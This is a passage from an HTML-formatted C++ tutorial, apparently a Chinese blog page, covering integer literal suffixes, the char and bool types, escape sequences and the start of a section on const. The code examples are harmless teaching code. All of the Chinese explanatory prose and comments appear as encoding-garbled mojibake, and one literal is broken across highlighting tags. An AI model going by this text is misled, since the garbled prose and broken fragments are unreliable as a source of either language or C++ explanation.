æ˜¯ 32 ä½ï¼Œè¿™ä¸ªå€¼è¶…å‡ºäº† int èŒƒå›´</span></span><br><span class="line">    <span class="comment">// ç¼–è¯‘å™¨ä¼šå°è¯• long æˆ– long long</span></span><br><span class="line">    process(<span class="number">3000000000</span>); <span class="comment">// å¯èƒ½è°ƒç”¨ process(long) æˆ– process(long long)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 0xFFFFFFFF: &quot;</span>; </span><br><span class="line">    <span class="comment">// è¿™ä¸ªåå…­è¿›åˆ¶æ•° (ç­‰äº 4294967295)</span></span><br><span class="line">    <span class="comment">// å¦‚æœ int æ˜¯ 32 ä½ï¼Œå®ƒè¶…å‡ºäº†æœ‰ç¬¦å· int çš„èŒƒå›´</span></span><br><span class="line">    <span class="comment">// ç¼–è¯‘å™¨ä¼šå°è¯• unsigned int, long, unsigned long...</span></span><br><span class="line">    process(<span class="number">0xFFFFFFFF</span>); <span class="comment">// å¯èƒ½è°ƒç”¨ process(unsigned int) æˆ– process(unsigned long)ç­‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨åç¼€æ˜ç¡®ç±»å‹</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 150L: &quot;</span>;</span><br><span class="line">    process(<span class="number">150L</span>); <span class="comment">// æ˜ç¡®è°ƒç”¨ process(long)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 200U: &quot;</span>;</span><br><span class="line">    process(<span class="number">200U</span>); <span class="comment">// æ˜ç¡®è°ƒç”¨ process(unsigned int)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 5000000000LL: &quot;</span>;</span><br><span class="line">    process(<span class="number">5000000000L</span>L); <span class="comment">// æ˜ç¡®è°ƒç”¨ process(long long)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å…³é”®ç‚¹:</strong> å¦‚æœä¸ç¡®å®šå¸¸é‡ä¼šè¢«æ¨æ–­æˆä»€ä¹ˆç±»å‹ï¼Œæˆ–è€…æƒ³è¦ç¡®ä¿å®ƒæ˜¯ç‰¹å®šç±»å‹ï¼Œæœ€å¥½ä½¿ç”¨åç¼€ã€‚</p><h3 id="3-1-8-charç±»å‹ï¼šå­—ç¬¦å’Œå°æ•´æ•°"><a href="#3-1-8-charç±»å‹ï¼šå­—ç¬¦å’Œå°æ•´æ•°" class="headerlink" title="3.1.8 charç±»å‹ï¼šå­—ç¬¦å’Œå°æ•´æ•°"></a>3.1.8 charç±»å‹ï¼šå­—ç¬¦å’Œå°æ•´æ•°</h3><p><code>char</code> ç±»å‹æ˜¯å¦ä¸€ç§æ•´å‹ç±»å‹ï¼Œå®ƒè¢«è®¾è®¡ç”¨æ¥å­˜å‚¨**å­—ç¬¦ (character)**ï¼Œä¾‹å¦‚å­—æ¯ã€æ•°å­—ã€æ ‡ç‚¹ç¬¦å·ç­‰ã€‚</p><p><strong>ç‰¹ç‚¹:</strong></p><ul><li>  <strong>å¤§å°:</strong> <code>char</code> é€šå¸¸å ç”¨ 1 ä¸ªå­—èŠ‚ï¼ˆ8ä½ï¼‰çš„å†…å­˜ã€‚è¿™æ˜¯C++æ ‡å‡†ä¿è¯çš„ (<code>sizeof(char)</code> æ€»æ˜¯ 1)ã€‚</li><li>  <strong>å­—ç¬¦è¡¨ç¤º:</strong> è®¡ç®—æœºå†…éƒ¨ä½¿ç”¨æ•°å€¼ç¼–ç ï¼ˆå¦‚ ASCII æˆ– Unicode çš„å­é›†ï¼‰æ¥è¡¨ç¤ºå­—ç¬¦ã€‚<code>char</code> å˜é‡å­˜å‚¨çš„æ˜¯è¿™äº›å­—ç¬¦å¯¹åº”çš„æ•´æ•°ç¼–ç ã€‚</li><li>  <strong>å­—ç¬¦å­—é¢å€¼:</strong> ä½¿ç”¨å•å¼•å· <code>&#39; &#39;</code> æ‹¬èµ·æ¥è¡¨ç¤ºå•ä¸ªå­—ç¬¦å­—é¢å€¼ï¼Œä¾‹å¦‚ <code>&#39;A&#39;</code>, <code>&#39;a&#39;</code>, <code>&#39;5&#39;</code>, <code>&#39;?&#39;</code>, <code>&#39;\n&#39;</code> (æ¢è¡Œç¬¦)ã€‚</li><li>  <strong>æ•´æ•°ç±»å‹:</strong> <code>char</code> æœ¬è´¨ä¸Šä»ç„¶æ˜¯ä¸€ä¸ªæ•´æ•°ç±»å‹ã€‚å®ƒå¯ä»¥å‚ä¸ç®—æœ¯è¿ç®—ã€‚</li><li><strong>æœ‰ç¬¦å· vs æ— ç¬¦å·:</strong> <code>char</code> ç±»å‹å…·ä½“æ˜¯æœ‰ç¬¦å· (<code>signed char</code>) è¿˜æ˜¯æ— ç¬¦å· (<code>unsigned char</code>) å–å†³äºç¼–è¯‘å™¨å®ç°ã€‚å¦‚æœä½ éœ€è¦æ˜ç¡®ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>signed char</code> æˆ– <code>unsigned char</code>ã€‚<ul><li>  <code>signed char</code>: èŒƒå›´é€šå¸¸æ˜¯ -128 åˆ° 127ã€‚</li><li>  <code>unsigned char</code>: èŒƒå›´é€šå¸¸æ˜¯ 0 åˆ° 255ã€‚</li></ul></li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> grade = <span class="string">&#x27;A&#x27;</span>; <span class="comment">// å­˜å‚¨å­—ç¬¦ &#x27;A&#x27;</span></span><br><span class="line">    <span class="keyword">char</span> initial = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> symbol = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> newline = <span class="string">&#x27;\n&#x27;</span>; <span class="comment">// å­˜å‚¨æ¢è¡Œç¬¦ (è½¬ä¹‰åºåˆ—)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Your grade is: &quot;</span> &lt;&lt; grade &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial: &quot;</span> &lt;&lt; initial &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Symbol: &quot;</span> &lt;&lt; symbol &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Printing a newline:&quot;</span> &lt;&lt; newline; <span class="comment">// è¾“å‡ºä¸€ä¸ªæ¢è¡Œ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After newline.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cout ä¼šå°† char ç±»å‹è§£é‡Šä¸ºå­—ç¬¦è¿›è¡Œæ‰“å°</span></span><br><span class="line">    <span class="comment">// å¦‚æœæƒ³çœ‹åˆ°å­—ç¬¦å¯¹åº”çš„æ•´æ•°ç¼–ç ï¼Œéœ€è¦è¿›è¡Œç±»å‹è½¬æ¢</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The integer code for &#x27;A&#x27; is: &quot;</span> &lt;&lt; <span class="keyword">int</span>(grade) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The integer code for &#x27;$&#x27; is: &quot;</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(symbol) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// char ä½œä¸ºå°æ•´æ•°ä½¿ç”¨</span></span><br><span class="line">    <span class="keyword">char</span> small_num = <span class="number">65</span>; <span class="comment">// 65 æ˜¯ ASCII ç ä¸­ &#x27;A&#x27; çš„å€¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Character with code 65: &quot;</span> &lt;&lt; small_num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç®—æœ¯è¿ç®—</span></span><br><span class="line">    <span class="keyword">char</span> next_char = grade + <span class="number">1</span>; <span class="comment">// &#x27;A&#x27; çš„ç¼–ç åŠ  1 å¾—åˆ° &#x27;B&#x27; çš„ç¼–ç </span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Character after &#x27;A&#x27;: &quot;</span> &lt;&lt; next_char &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &#x27;B&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å…¥å­—ç¬¦</span></span><br><span class="line">    <span class="keyword">char</span> response;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a character: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; response; <span class="comment">// è¯»å–ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; response &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Its code is: &quot;</span> &lt;&lt; <span class="keyword">int</span>(response) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ˜ç¡®ä½¿ç”¨ signed/unsigned char</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">char</span> sc = <span class="number">-5</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> uc = <span class="number">250</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Signed char: &quot;</span> &lt;&lt; <span class="keyword">int</span>(sc) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è½¬æ¢ä¸º int æ‰“å°æ•°å€¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned char: &quot;</span> &lt;&lt; <span class="keyword">int</span>(uc) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è½¬ä¹‰åºåˆ— (Escape Sequence):</strong><br>ä»¥åæ–œæ  <code>\</code> å¼€å¤´çš„ç‰¹æ®Šå­—ç¬¦åºåˆ—ï¼Œç”¨äºè¡¨ç¤ºæ— æ³•ç›´æ¥è¾“å…¥çš„å­—ç¬¦æˆ–å…·æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ã€‚å¸¸ç”¨è½¬ä¹‰åºåˆ—åŒ…æ‹¬ï¼š</p><ul><li>  <code>\n</code>: æ¢è¡Œç¬¦</li><li>  <code>\t</code>: æ°´å¹³åˆ¶è¡¨ç¬¦ (Tab)</li><li>  <code>\r</code>: å›è½¦ç¬¦</li><li>  <code>\\</code>: åæ–œæ æœ¬èº«</li><li>  <code>\&#39;</code>: å•å¼•å·</li><li>  <code>\&quot;</code>: åŒå¼•å·</li><li>  <code>\?</code>: é—®å·</li><li>  <code>\0</code>: ç©ºå­—ç¬¦ (Null character)</li><li>  <code>\xhh</code>: ç”¨ä¸¤ä½åå…­è¿›åˆ¶æ•° hh è¡¨ç¤ºå­—ç¬¦</li><li>  <code>\ooo</code>: ç”¨æœ€å¤šä¸‰ä½å…«è¿›åˆ¶æ•° ooo è¡¨ç¤ºå­—ç¬¦</li></ul><h3 id="3-1-9-boolç±»å‹"><a href="#3-1-9-boolç±»å‹" class="headerlink" title="3.1.9 boolç±»å‹"></a>3.1.9 boolç±»å‹</h3><p><code>bool</code> ç±»å‹æ˜¯C++ä¸­çš„<strong>å¸ƒå°” (Boolean)</strong> ç±»å‹ï¼Œç”¨äºè¡¨ç¤ºé€»è¾‘å€¼ï¼š<strong>çœŸ (true)</strong> æˆ– **å‡ (false)**ã€‚</p><p><strong>ç‰¹ç‚¹:</strong></p><ul><li>  <strong>å–å€¼:</strong> <code>bool</code> å˜é‡åªèƒ½å­˜å‚¨ä¸¤ä¸ªå€¼ï¼š<code>true</code> å’Œ <code>false</code>ã€‚è¿™ä¸¤ä¸ªæ˜¯C++å…³é”®å­—ã€‚</li><li><strong>æ•´æ•°è½¬æ¢:</strong><ul><li>  åœ¨éœ€è¦æ•´æ•°çš„åœ°æ–¹ï¼Œ<code>true</code> ä¼šè¢«è½¬æ¢ä¸º <code>1</code>ï¼Œ<code>false</code> ä¼šè¢«è½¬æ¢ä¸º <code>0</code>ã€‚</li><li>  åœ¨éœ€è¦å¸ƒå°”å€¼çš„åœ°æ–¹ï¼Œä»»ä½•éé›¶æ•´æ•°å€¼ä¼šè¢«è½¬æ¢ä¸º <code>true</code>ï¼Œé›¶å€¼ä¼šè¢«è½¬æ¢ä¸º <code>false</code>ã€‚æŒ‡é’ˆç±»å‹ä¹Ÿå¯ä»¥è½¬æ¢ä¸º <code>bool</code>ï¼ˆç©ºæŒ‡é’ˆä¸º <code>false</code>ï¼Œéç©ºæŒ‡é’ˆä¸º <code>true</code>ï¼‰ã€‚</li></ul></li><li>  <strong>å¤§å°:</strong> <code>bool</code> ç±»å‹çš„å¤§å°æ²¡æœ‰ä¸¥æ ¼è§„å®šï¼Œä½†é€šå¸¸æ˜¯ 1 ä¸ªå­—èŠ‚ï¼Œå³ä½¿å®ƒåªéœ€è¦ 1 ä½æ¥å­˜å‚¨ä¿¡æ¯ã€‚</li><li>  <strong>ç”¨é€”:</strong> ä¸»è¦ç”¨äºå­˜å‚¨æ¡ä»¶åˆ¤æ–­ï¼ˆå¦‚ <code>if</code> è¯­å¥ã€å¾ªç¯æ¡ä»¶ï¼‰çš„ç»“æœã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> isReady = <span class="literal">true</span>; <span class="comment">// å£°æ˜å¹¶åˆå§‹åŒ–ä¸º true</span></span><br><span class="line">    <span class="keyword">bool</span> hasError = <span class="literal">false</span>; <span class="comment">// å£°æ˜å¹¶åˆå§‹åŒ–ä¸º false</span></span><br><span class="line">    <span class="keyword">bool</span> isEmpty; <span class="comment">// æœªåˆå§‹åŒ– (å€¼ä¸ç¡®å®š)</span></span><br><span class="line"></span><br><span class="line">    isEmpty = <span class="literal">false</span>; <span class="comment">// èµ‹å€¼</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isReady (default output): &quot;</span> &lt;&lt; isReady &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// é€šå¸¸è¾“å‡º 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hasError (default output): &quot;</span> &lt;&lt; hasError &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// é€šå¸¸è¾“å‡º 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isEmpty (default output): &quot;</span> &lt;&lt; isEmpty &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ std::boolalpha æ§åˆ¶ç¬¦ä»¥ &quot;true&quot;/&quot;false&quot; å½¢å¼è¾“å‡º</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::boolalpha; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isReady (boolalpha): &quot;</span> &lt;&lt; isReady &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hasError (boolalpha): &quot;</span> &lt;&lt; hasError &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isEmpty (boolalpha): &quot;</span> &lt;&lt; isEmpty &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::noboolalpha; <span class="comment">// å…³é—­ boolalpha æ ¼å¼</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// bool å’Œæ•´æ•°è½¬æ¢</span></span><br><span class="line">    <span class="keyword">int</span> ready_int = isReady; <span class="comment">// ready_int å˜ä¸º 1</span></span><br><span class="line">    <span class="keyword">int</span> error_int = hasError; <span class="comment">// error_int å˜ä¸º 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;isReady as int: &quot;</span> &lt;&lt; ready_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hasError as int: &quot;</span> &lt;&lt; error_int &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> from_int_non_zero = <span class="number">100</span>; <span class="comment">// 100 (éé›¶) è½¬æ¢ä¸º true</span></span><br><span class="line">    <span class="keyword">bool</span> from_int_zero = <span class="number">0</span>;     <span class="comment">// 0 è½¬æ¢ä¸º false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::boolalpha;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bool from 100: &quot;</span> &lt;&lt; from_int_non_zero &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bool from 0: &quot;</span> &lt;&lt; from_int_zero &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// è¾“å‡º false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨æ¡ä»¶è¯­å¥ä¸­ä½¿ç”¨</span></span><br><span class="line">    <span class="keyword">if</span> (isReady) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;System is ready.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;System is not ready.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!hasError) &#123; <span class="comment">// ! æ˜¯é€»è¾‘éè¿ç®—ç¬¦</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No errors detected.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;An error occurred.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-consté™å®šç¬¦"><a href="#3-2-consté™å®šç¬¦" class="headerlink" title="3.2 consté™å®šç¬¦"></a>3.2 consté™å®šç¬¦</h2><p>ç°åœ¨æˆ‘ä»¬æ¥æ¢è®¨ä¸€ç§åœ¨C++ä¸­åˆ›å»º<strong>å¸¸é‡ (Constant)</strong> çš„æ›´å¯é çš„æ–¹æ³•ï¼šä½¿ç”¨ <code>const</code> é™å®šç¬¦ã€‚å¸¸é‡æ˜¯æŒ‡åœ¨ç¨‹åºè¿è¡ŒæœŸé—´å…¶å€¼ä¸èƒ½è¢«ä¿®æ”¹çš„é‡ã€‚</p><p><code>const</code> æ˜¯ä¸€ä¸ª**ç±»å‹é™å®šç¬¦ (Type Qualifier)**ï¼Œå®ƒç”¨äºä¿®æ”¹å˜é‡çš„å£°æ˜ï¼Œä½¿å…¶æˆä¸ºåªè¯»ã€‚</p><p><strong>ä½œç”¨:</strong></p><ul><li>  <strong>åˆ›å»ºç¬¦å·å¸¸é‡:</strong> <code>const</code> å…è®¸ä½ ä¸ºå¸¸é‡å€¼ï¼ˆå¦‚åœ†å‘¨ç‡ã€æœ€å¤§å°è¯•æ¬¡æ•°ç­‰ï¼‰èµ‹äºˆä¸€ä¸ªæœ‰æ„ä¹‰çš„åç§°ï¼Œæé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</li><li>  <strong>é˜²æ­¢æ„å¤–ä¿®æ”¹:</strong> ä¸€æ—¦å˜é‡è¢«å£°æ˜ä¸º <code>const</code> å¹¶åˆå§‹åŒ–åï¼Œç¼–è¯‘å™¨ä¼šé˜»æ­¢ä»»ä½•è¯•å›¾ä¿®æ”¹è¯¥å˜é‡å€¼çš„ä»£ç ã€‚è¿™æœ‰åŠ©äºé˜²æ­¢å› æ„å¤–èµ‹å€¼è€Œå¯¼è‡´çš„é”™è¯¯ã€‚</li><li>  <strong>ç±»å‹å®‰å…¨:</strong> ä¸ä½¿ç”¨ <code>#define</code> åˆ›å»ºå®å¸¸é‡ç›¸æ¯”ï¼Œ<code>const</code> å¸¸é‡å…·æœ‰æ˜ç¡®çš„æ•°æ®ç±»å‹ï¼Œç¼–è¯‘å™¨å¯ä»¥å¯¹å…¶è¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œæ›´åŠ å®‰å…¨ã€‚</li><li>  <strong>ä½œç”¨åŸŸ:</strong> <code>const</code> å¸¸é‡éµå¾ªæ ‡å‡†çš„ä½œç”¨åŸŸè§„åˆ™ï¼ˆä¾‹å¦‚ï¼Œåœ¨å‡½æ•°å†…éƒ¨å®šä¹‰çš„ <code>const</code> å¸¸é‡åªåœ¨è¯¥å‡½æ•°å†…æœ‰æ•ˆï¼‰ï¼Œè€Œ <code>#define</code> å®æ˜¯å…¨å±€æ›¿æ¢ã€‚</li></ul><p><strong>å£°æ˜å’Œåˆå§‹åŒ–:</strong></p><p>å£°æ˜ <code>const</code> å˜é‡çš„è¯­æ³•æ˜¯åœ¨ç±»å‹åå‰æˆ–ç±»å‹åååŠ ä¸Š <code>const</code> å…³é”®å­—ã€‚<strong>å…³é”®åœ¨äºï¼Œ<code>const</code> å˜é‡å¿…é¡»åœ¨å£°æ˜æ—¶è¿›è¡Œåˆå§‹åŒ–</strong>ï¼Œå› ä¸ºä¹‹åå°±ä¸èƒ½å†ç»™å®ƒèµ‹å€¼äº†ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> type variableName = value; </span><br><span class="line"><span class="comment">// æˆ–è€…</span></span><br><span class="line">type <span class="keyword">const</span> variableName = value; <span class="comment">// ä¸¤ç§å†™æ³•ç­‰æ•ˆï¼Œç¬¬ä¸€ç§æ›´å¸¸è§</span></span><br></pre></td></tr></table></figure><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å£°æ˜å¹¶åˆå§‹åŒ– const å˜é‡</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> MONTHS_IN_YEAR = <span class="number">12</span>; <span class="comment">// å¸¸é‡ï¼Œè¡¨ç¤ºä¸€å¹´ä¸­çš„æœˆä»½æ•°</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">double</span> PI = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* GREETING = <span class="string">&quot;Hello, world!&quot;</span>; <span class="comment">// æŒ‡å‘å¸¸é‡å­—ç¬¦ä¸²çš„å¸¸é‡æŒ‡é’ˆ (æ›´å¤æ‚ï¼Œåç»­ç« èŠ‚è¯¦è§£)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å°è¯•ä¿®æ”¹ const å˜é‡ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯</span></span><br><span class="line">    <span class="comment">// MONTHS_IN_YEAR = 13; // é”™è¯¯! ä¸èƒ½ç»™ const 